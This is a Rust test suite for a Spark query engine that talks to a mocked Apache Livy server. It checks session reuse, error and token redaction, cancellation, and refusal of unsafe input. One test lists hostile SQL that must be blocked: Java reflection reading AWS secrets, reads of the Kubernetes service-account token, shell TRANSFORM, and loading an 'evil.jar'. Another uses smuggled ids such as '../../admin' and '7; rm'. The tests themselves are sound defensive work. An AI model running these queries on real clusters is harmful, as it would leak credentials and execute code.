//! The Spark engine against an in-process mock speaking Apache Livy's REST API.
#![cfg(feature = "iceberg")]

mod remote_common;

use std::collections::BTreeMap;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use remote_common::*;
use secrecy::SecretString;
use serde_json::{Value, json};
use vibelens_core::CoreError;
use vibelens_core::model::*;
use vibelens_core::remote::{LIVY_DEFAULT_ROW_CAP, SparkConfig, SparkEngine};

const TOKEN: &str = "livy-T0ken-abc123";

fn config(url: &str) -> SparkConfig {
    let mut conf = BTreeMap::new();
    conf.insert(
        "spark.sql.catalog.lake".to_string(),
        "org.apache.iceberg.spark.SparkCatalog".to_string(),
    );
    SparkConfig {
        url: url.to_string(),
        catalog: "lake".into(),
        namespace: Some("shop.daily".into()),
        auth: HttpEngineAuth::Bearer,
        ca_cert_path: None,
        proxy_user: Some("ana".into()),
        session_conf: conf,
        session_start_timeout: Some(Duration::from_secs(5)),
    }
}

fn engine_with(cfg: SparkConfig) -> SparkEngine {
    SparkEngine::new(cfg, Some(SecretString::from(TOKEN.to_string())))
        .unwrap()
        .with_timing(timing())
}

fn engine(url: &str) -> SparkEngine {
    engine_with(config(url))
}

async fn stream(e: &SparkEngine, sql: &str, o: ExecOptions) -> Vec<QueryEvent> {
    collect_events(None, |cancel, tx| {
        e.execute_stream("q1".into(), sql, o, cancel, tx)
    })
    .await
}

fn table(fields: &[(&str, &str)], rows: Value) -> Value {
    json!({"status": "ok", "execution_count": 1, "data": {"application/json": {
        "schema": {"type": "struct", "fields": fields.iter().map(|(n, t)| json!({
            "name": n, "type": t, "nullable": true, "metadata": {}
        })).collect::<Vec<_>>()},
        "data": rows,
    }}})
}

fn empty_ok() -> Value {
    json!({"status": "ok", "execution_count": 0, "data": {"application/json": {
        "schema": {"type": "struct", "fields": []}, "data": []
    }}})
}

/// What the mock Livy server does. Statement 0 of every session is the `USE`; every later
/// statement is "running" for `running_polls` polls, then available with `output(code)`.
struct Livy {
    /// The `id` the next `POST /sessions` returns.
    session_ids: Mutex<Vec<Value>>,
    starting_polls: usize,
    running_polls: usize,
    output: Box<dyn Fn(&str) -> Value + Send + Sync>,
    /// `POST /sessions/{id}/statements` answers 404 this many times (after the `USE`).
    gone: AtomicUsize,
    statement_id: Box<dyn Fn(usize) -> Value + Send + Sync>,
    // Bookkeeping.
    session_polls: AtomicUsize,
    code_by_stmt: Mutex<Vec<String>>,
    stmt_polls: AtomicUsize,
}

impl Livy {
    fn new(output: impl Fn(&str) -> Value + Send + Sync + 'static) -> Self {
        Self {
            session_ids: Mutex::new(vec![json!(3), json!(4)]),
            starting_polls: 1,
            running_polls: 1,
            output: Box::new(output),
            gone: AtomicUsize::new(0),
            statement_id: Box::new(|n| json!(n)),
            session_polls: AtomicUsize::new(0),
            code_by_stmt: Mutex::new(Vec::new()),
            stmt_polls: AtomicUsize::new(0),
        }
    }

    fn handle(&self, req: &Req) -> Resp {
        let parts: Vec<&str> = req.path.trim_start_matches('/').split('/').collect();
        match (req.method.as_str(), parts.as_slice()) {
            ("POST", ["sessions"]) => {
                let id = self.session_ids.lock().unwrap().remove(0);
                self.code_by_stmt.lock().unwrap().clear();
                Resp::json(201, &json!({"id": id, "state": "starting", "kind": "sql"}))
            }
            ("GET", ["sessions", _]) => {
                let n = self.session_polls.fetch_add(1, Ordering::SeqCst);
                let state = if n % (self.starting_polls + 1) < self.starting_polls {
                    "starting"
                } else {
                    "idle"
                };
                Resp::ok(&json!({"id": 3, "state": state}))
            }
            ("DELETE", ["sessions", _]) => Resp::ok(&json!({"msg": "deleted"})),
            ("POST", ["sessions", _, "statements"]) => {
                let code = req.json()["code"].as_str().unwrap_or("").to_string();
                let mut codes = self.code_by_stmt.lock().unwrap();
                let gone = self.gone.load(Ordering::SeqCst);
                if !codes.is_empty() && gone > 0 {
                    self.gone.store(gone - 1, Ordering::SeqCst);
                    return Resp::text(404, "Session '3' not found.");
                }
                codes.push(code);
                let n = codes.len() - 1;
                Resp::json(
                    201,
                    &json!({"id": (self.statement_id)(n), "state": "waiting"}),
                )
            }
            ("POST", ["sessions", _, "statements", _, "cancel"]) => {
                Resp::ok(&json!({"msg": "canceled"}))
            }
            ("GET", ["sessions", _, "statements", n]) => {
                let n: usize = n.parse().unwrap_or(0);
                let code = self
                    .code_by_stmt
                    .lock()
                    .unwrap()
                    .get(n)
                    .cloned()
                    .unwrap_or_default();
                if code.starts_with("USE ") {
                    return Resp::ok(&json!({"id": n, "state": "available", "output": empty_ok()}));
                }
                let polls = self.stmt_polls.fetch_add(1, Ordering::SeqCst);
                if polls < self.running_polls {
                    return Resp::ok(&json!({"id": n, "state": "running"}))
                        .after(Duration::from_millis(5));
                }
                self.stmt_polls.store(0, Ordering::SeqCst);
                Resp::ok(&json!({"id": n, "state": "available", "output": (self.output)(&code)}))
            }
            _ => Resp::text(404, "unexpected"),
        }
    }
}

async fn livy(l: Livy) -> (MockServer, Arc<Livy>) {
    let l = Arc::new(l);
    let h = l.clone();
    let server = serve(Arc::new(move |req: &Req| h.handle(req))).await;
    (server, l)
}

#[tokio::test]
async fn a_session_is_created_once_switched_to_the_catalog_reused_and_deleted_on_close() {
    let (server, mock) = livy(Livy::new(|_| {
        table(
            &[
                ("id", "long"),
                ("name", "string"),
                ("price", "decimal(10,2)"),
            ],
            json!([
                [1, "ann", 1.5],
                [9007199254740993u64, null, null],
                [3, "cy", 2]
            ]),
        )
    }))
    .await;
    let e = engine(&server.url);
    let events = stream(&e, "SELECT id, name, price FROM orders", opts()).await;
    assert_eq!(
        kinds(&events),
        [
            "started", "columns", "rows", "rows", "stats", "done", "finished"
        ],
        "{events:#?}"
    );
    assert_eq!(
        rows(&events),
        vec![
            vec![json!("1"), json!("ann"), json!("1.5")],
            vec![json!("9007199254740993"), Value::Null, Value::Null],
            vec![json!("3"), json!("cy"), json!("2")],
        ]
    );
    let QueryEvent::Stats {
        engine,
        engine_query_id,
        bytes_scanned,
        cost_usd_estimate,
        ..
    } = &events[4]
    else {
        panic!()
    };
    assert_eq!(engine, "spark");
    assert_eq!(engine_query_id.as_deref(), Some("3/1"));
    assert_eq!((*bytes_scanned, *cost_usd_estimate), (None, None));

    // The session was asked for with the profile's settings, then switched to the catalog.
    let created = server.calls("POST", "/sessions");
    assert_eq!(created.len(), 1);
    let body = created[0].json();
    assert_eq!(body["kind"], "sql");
    assert_eq!(body["proxyUser"], "ana");
    assert_eq!(
        body["conf"]["spark.sql.catalog.lake"],
        "org.apache.iceberg.spark.SparkCatalog"
    );
    assert_eq!(
        mock.code_by_stmt.lock().unwrap()[0],
        "USE `lake`.`shop`.`daily`"
    );

    // A second query reuses the session.
    let r = e
        .execute_collect("SELECT 1", ExecOptions::default())
        .await
        .unwrap();
    assert_eq!(r.row_count, 3);
    assert_eq!(server.calls("POST", "/sessions").len(), 1);
    assert_eq!(e.session_id(), Some(3));

    for r in server.all() {
        assert_eq!(r.headers["x-requested-by"], "vibelens");
        assert_eq!(r.headers["authorization"], format!("Bearer {TOKEN}"));
    }

    e.close().await;
    assert_eq!(server.calls("DELETE", "/sessions/3").len(), 1);
    let events = stream(&e, "SELECT 1", opts()).await;
    assert_eq!(failure(&events).1, "not_connected");
}

#[tokio::test]
async fn a_statement_error_keeps_evalue_and_drops_the_traceback() {
    let (server, _) = livy(Livy::new(|_| {
        json!({"status": "error", "ename": "AnalysisException",
               "evalue": format!("Table or view not found: nope; token {TOKEN}"),
               "traceback": ["org.apache.spark.sql.Something(Foo.scala:1)"]})
    }))
    .await;
    let events = stream(&engine(&server.url), "SELECT * FROM nope", opts()).await;
    let (idx, code, msg) = failure(&events);
    assert_eq!((idx, code.as_str()), (Some(0), "database"));
    assert!(
        msg.contains("AnalysisException: Table or view not found"),
        "{msg}"
    );
    assert!(!msg.contains("Foo.scala") && !msg.contains(TOKEN), "{msg}");
}

#[tokio::test]
async fn a_session_that_died_is_replaced_once() {
    let l = Livy::new(|_| table(&[("n", "integer")], json!([[1]])));
    let (server, mock) = livy(l).await;
    let e = engine(&server.url);
    e.execute_collect("SELECT 1", ExecOptions::default())
        .await
        .unwrap();
    // Livy garbage-collected the session between two queries.
    mock.gone.store(1, Ordering::SeqCst);
    let r = e
        .execute_collect("SELECT 1", ExecOptions::default())
        .await
        .unwrap();
    assert_eq!(r.rows, vec![vec![json!(1)]]);
    assert_eq!(server.calls("POST", "/sessions").len(), 2);
    assert_eq!(e.session_id(), Some(4));

    // Only once: a replacement that is gone too is an error, not a loop.
    let mut l = Livy::new(|_| empty_ok());
    l.gone = AtomicUsize::new(2);
    let (server, _) = livy(l).await;
    let e = engine(&server.url);
    let events = stream(&e, "SELECT 1", opts()).await;
    assert_eq!(failure(&events).1, "database");
    assert_eq!(server.calls("POST", "/sessions").len(), 2);
}

/// Without the check, an id like `../../x` from the server would be put into a URL that also
/// carries the credential.
#[tokio::test]
async fn ids_that_are_not_non_negative_integers_are_refused() {
    for bad in [json!("../../admin"), json!(-1), json!(1.5)] {
        let mut l = Livy::new(|_| empty_ok());
        l.session_ids = Mutex::new(vec![bad.clone()]);
        let (server, _) = livy(l).await;
        let events = stream(&engine(&server.url), "SELECT 1", opts()).await;
        let (_, _, msg) = failure(&events);
        assert!(msg.contains("not a non-negative integer"), "{bad}: {msg}");
        assert_eq!(server.count(), 1, "{bad}: nothing after the POST");
    }
    let mut l = Livy::new(|_| empty_ok());
    l.statement_id = Box::new(|n| if n == 0 { json!(0) } else { json!("7; rm") });
    let (server, _) = livy(l).await;
    let events = stream(&engine(&server.url), "SELECT 1", opts()).await;
    assert!(failure(&events).2.contains("statement id"));
    assert!(server.all().iter().all(|r| !r.path.contains("rm")));
}

/// A Spark SELECT can call Java methods and read files; read-only runs (every agent run without
/// approval) refuse those before anything reaches Livy.
#[tokio::test]
async fn read_only_and_session_refusals_happen_before_any_request() {
    let (server, _) = livy(Livy::new(|_| empty_ok())).await;
    let e = engine(&server.url);
    let ro = ExecOptions {
        read_only: true,
        ..opts()
    };
    for sql in [
        "SELECT reflect('java.lang.Runtime', 'getRuntime')",
        "SELECT java_method('java.lang.System', 'getenv', 'AWS_SECRET_ACCESS_KEY')",
        "SELECT try_reflect('java.lang.System', 'exit', 0)",
        "SELECT * FROM text.`file:///var/run/secrets/kubernetes.io/serviceaccount/token`",
        "SELECT * FROM text.`/var/run/secrets/kubernetes.io/serviceaccount/token`",
        "SELECT * FROM parquet.`s3a://other-bucket/x`",
        "SELECT TRANSFORM(a) USING 'id' FROM t",
        "ADD JAR s3://b/evil.jar",
        "CACHE TABLE t",
        "INSERT INTO t VALUES (1)",
        "SELECT 1; SELECT reflect('a','b')",
    ] {
        let events = stream(&e, sql, ro.clone()).await;
        assert_eq!(failure(&events).1, "policy_denied", "{sql}");
    }
    for sql in [
        "USE lake.other",
        "SET spark.sql.ansi.enabled=false",
        "RESET",
    ] {
        let events = stream(&e, sql, opts()).await;
        assert_eq!(failure(&events).1, "policy_denied", "{sql}");
    }
    assert_eq!(server.count(), 0);
}

/// Without the cancel request, a cancelled statement would keep running on the cluster.
#[tokio::test]
async fn cancel_reaches_livy() {
    let mut l = Livy::new(|_| empty_ok());
    l.running_polls = usize::MAX;
    let (server, _) = livy(l).await;
    let e = engine(&server.url);
    let events = collect_events(Some(Duration::from_millis(200)), |cancel, tx| {
        e.execute_stream("q1".into(), "SELECT * FROM big", opts(), cancel, tx)
    })
    .await;
    assert_eq!(failure(&events).1, "cancelled");
    assert_eq!(
        server
            .calls("POST", "/sessions/3/statements/1/cancel")
            .len(),
        1
    );
}

#[tokio::test]
async fn a_timeout_cancels_the_statement() {
    let mut l = Livy::new(|_| empty_ok());
    l.running_polls = usize::MAX;
    let (server, _) = livy(l).await;
    let o = ExecOptions {
        timeout_ms: Some(150),
        ..opts()
    };
    let events = stream(&engine(&server.url), "SELECT * FROM big", o).await;
    assert_eq!(failure(&events).1, "timeout");
    assert_eq!(
        server
            .calls("POST", "/sessions/3/statements/1/cancel")
            .len(),
        1
    );
}

#[tokio::test]
async fn a_session_that_does_not_start_in_time_is_deleted() {
    let mut l = Livy::new(|_| empty_ok());
    l.starting_polls = usize::MAX - 1;
    let (server, _) = livy(l).await;
    let e = engine_with(SparkConfig {
        session_start_timeout: Some(Duration::from_millis(150)),
        ..config(&server.url)
    });
    let events = stream(&e, "SELECT 1", opts()).await;
    let (_, code, msg) = failure(&events);
    assert_eq!(code, "timeout", "{msg}");
    assert_eq!(server.calls("DELETE", "/sessions/3").len(), 1);
    assert_eq!(e.session_id(), None);
}

/// Livy cuts SQL results at `livy.rsc.sql.num-rows` without saying so.
#[tokio::test]
async fn a_result_at_livys_row_cap_is_reported_as_possibly_truncated() {
    let rows: Vec<Value> = (0..LIVY_DEFAULT_ROW_CAP).map(|i| json!([i])).collect();
    let (server, _) = livy(Livy::new(move |_| {
        table(&[("n", "integer")], json!(rows.clone()))
    }))
    .await;
    let r = engine(&server.url)
        .execute_collect("SELECT n FROM t", ExecOptions::default())
        .await
        .unwrap();
    assert_eq!((r.row_count, r.truncated), (LIVY_DEFAULT_ROW_CAP, true));

    let (server, _) = livy(Livy::new(|_| table(&[("n", "integer")], json!([[1], [2]])))).await;
    let o = ExecOptions {
        max_rows: 1,
        ..ExecOptions::default()
    };
    let r = engine(&server.url)
        .execute_collect("SELECT n FROM t", o)
        .await
        .unwrap();
    assert_eq!((r.row_count, r.truncated), (1, true));
}

#[tokio::test]
async fn oversized_cells_are_cut() {
    let big = "z".repeat(MAX_CELL_BYTES + 1);
    let (server, _) = livy(Livy::new(move |_| {
        table(&[("s", "string")], json!([[big.clone()]]))
    }))
    .await;
    let r = engine(&server.url)
        .execute_collect("SELECT s FROM t", ExecOptions::default())
        .await
        .unwrap();
    assert!(is_truncated_cell(&r.rows[0][0]));
}

#[tokio::test]
async fn a_redirect_is_not_followed() {
    let elsewhere = serve(Arc::new(|_: &Req| Resp::ok(&json!({})))).await;
    let to = format!("{}/sessions?token=abc", elsewhere.url);
    let (server, _) = {
        let s = serve(Arc::new(move |_: &Req| Resp::redirect(&to))).await;
        (s, ())
    };
    let events = stream(&engine(&server.url), "SELECT 1", opts()).await;
    let (_, _, msg) = failure(&events);
    assert!(
        msg.contains("redirect") && !msg.contains("token=abc"),
        "{msg}"
    );
    assert_eq!(elsewhere.count(), 0);
}

#[tokio::test]
async fn a_rejected_token_is_reported_without_it() {
    let s = serve(Arc::new(|req: &Req| {
        Resp::text(
            401,
            &format!(
                "denied: {}",
                req.headers
                    .get("authorization")
                    .cloned()
                    .unwrap_or_default()
            ),
        )
    }))
    .await;
    let err = engine(&s.url)
        .execute_collect("SELECT 1", ExecOptions::default())
        .await
        .unwrap_err();
    assert!(matches!(err, CoreError::Auth(_)), "{err:?}");
    assert!(!err.to_string().contains(TOKEN), "{err}");
}

#[tokio::test]
async fn session_conf_with_a_credential_is_refused_by_the_engine_too() {
    let mut cfg = config("https://livy.example");
    cfg.session_conf
        .insert("spark.hadoop.fs.s3a.secret.key".into(), "x".into());
    assert!(matches!(
        SparkEngine::new(cfg, Some(SecretString::from(TOKEN.to_string()))),
        Err(CoreError::Invalid(_))
    ));
    let cfg = SparkConfig {
        url: "http://livy.internal:8998".into(),
        ..config("x")
    };
    assert!(matches!(
        SparkEngine::new(cfg, Some(SecretString::from(TOKEN.to_string()))),
        Err(CoreError::Invalid(_))
    ));
}
